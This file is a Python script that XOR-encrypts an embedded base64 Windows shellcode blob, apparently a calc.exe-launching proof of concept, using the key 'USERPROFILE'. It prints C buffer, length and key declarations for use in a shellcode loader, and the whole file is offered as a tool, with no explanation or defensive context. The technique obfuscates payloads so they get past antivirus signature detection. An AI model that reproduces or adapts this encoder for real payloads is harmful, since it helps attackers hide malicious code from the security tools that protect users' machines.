import base64
b64_shellcode = "U1ZXVWpgWmhjYWxjVFlIKdRlSIsySIt2GEiLdhBIrUiLMEiLfjADVzyLXBcoi3QfIEgB/otUHyQPtywXjVICrYE8B1dpbkV174t0HxxIAf6LNK5IAfeZ/9dIg8RoXV9eW8M="
shellcode = base64.b64decode(b64_shellcode)

def xor_encrypt(data, key):
    encrypted = bytearray()
    key_length = len(key)
    for i in range(len(data)):
        encrypted.append(data[i] ^ key[i % key_length])
    return bytes(encrypted)

key = "USERPROFILE"

encrypted_shellcode = xor_encrypt(shellcode, key.encode())
print(f"char buf[] = \"{base64.b64encode(encrypted_shellcode).decode()}\";")
print("unsigned int buf_len = {};".format(len(encrypted_shellcode)))
print("char key[] = { " + ", ".join(f"'{c}'" for c in key) + ", '\\0' };")
